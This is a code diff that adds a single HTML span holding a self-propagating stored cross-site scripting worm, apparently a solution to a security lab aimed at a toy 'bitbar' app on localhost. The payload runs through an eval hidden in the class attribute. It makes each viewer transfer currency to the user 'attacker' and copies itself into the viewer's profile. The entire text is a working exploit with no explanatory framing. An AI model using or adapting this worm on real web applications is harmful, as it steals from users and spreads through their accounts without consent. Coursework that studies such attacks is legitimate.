@@ -1,0 +1,11 @@
+<span id="bitbar_count" class="eval(document.getElementById('bitbar_count').innerHTML.replace('amp;',''));">
+    var x = new XMLHttpRequest();
+    x.open("POST", "http://127.0.0.1:3000/post_transfer");
+    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    x.send("destination_username=attacker&quantity=1");
+
+    x = new XMLHttpRequest();
+    x.open("POST", "http://127.0.0.1:3000/set_profile");
+    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    x.send("new_profile=" + encodeURIComponent(document.getElementById("profile").innerHTML));
+</span>
